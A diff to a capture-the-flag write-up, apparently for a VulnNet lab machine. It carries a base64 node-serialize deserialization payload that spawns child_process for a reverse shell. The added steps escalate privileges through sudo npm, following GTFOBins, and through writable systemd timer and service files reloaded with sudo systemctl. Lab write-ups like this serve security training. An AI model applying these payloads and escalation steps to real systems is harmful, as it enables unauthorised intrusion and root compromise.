@@ -51,3 +51,43 @@ eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoXCJjaGlsZF9wcm9jZXNz
 ```
 
 ![rev_shell](./img/rev_shell.png)
+
+```bash
+www@ip-10-114-131-255:~$ sudo -l
+Matching Defaults entries for www on ip-10-114-131-255:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www may run the following commands on ip-10-114-131-255:
+    (serv-manage) NOPASSWD: /usr/bin/npm
+```
+
+[npm | GTFPBins](https://gtfobins.org/gtfobins/npm/)
+
+![serv-manage](./img/serv-manage.png)
+
+![user.txt](./img/user_txt.png)
+
+```bash
+serv-manage@ip-10-114-131-255:/home/www$ sudo -l
+Matching Defaults entries for serv-manage on ip-10-114-131-255:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User serv-manage may run the following commands on ip-10-114-131-255:
+    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl daemon-reload
+serv-manage@ip-10-114-131-255:/home/www$ ls -lah /etc/systemd/system/vulnnet-auto.timer
+-rw-rw-r-- 1 root serv-manage 167 Jan 24  2021 /etc/systemd/system/vulnnet-auto.timer
+serv-manage@ip-10-114-131-255:/home/www$ ls -lah /etc/systemd/system/vulnnet-job.service
+-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service
+```
+
+![vulnet-job_service](./img/vulnet-job_service.png)
+
+```bash
+serv-manage@ip-10-114-131-255:/home/www$ sudo /bin/systemctl daemon-reload
+serv-manage@ip-10-114-131-255:/home/www$ sudo /bin/systemctl stop vulnnet-auto.timer
+serv-manage@ip-10-114-131-255:/home/www$ sudo /bin/systemctl start vulnnet-auto.timer
+```
+
+![root.txt](./img/root_txt.png)
